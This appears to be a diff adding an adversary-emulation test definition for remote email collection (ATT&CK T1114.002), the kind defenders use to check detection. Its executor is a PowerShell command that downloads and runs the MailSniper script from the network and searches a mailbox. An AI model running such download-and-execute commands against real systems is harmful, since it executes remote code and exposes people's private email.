@@ -1,0 +1,18 @@
+attack_technique: T1114.002
+display_name: 'Email Collection: Remote Email Collection'
+atomic_tests:
+- name: Email Collection with PowerShell Get-Inbox
+  auto_generated_guid: 3f1b5096-0139-4736-9b78-19bcb02b1508
+  description: |
+    Collect user's credentials and interact directly with the Exchange server to acquire information from within a network.
+    access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens.
+    
+    Note: Tools such as MailSniper can be used to automate searches for specific keywords.
+  supported_platforms:
+  - windows     
+  executor:
+    command: |
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1')
+      Invoke-SelfSearch -Mailbox USER@CONTOSO.com
+    name: powershell
+
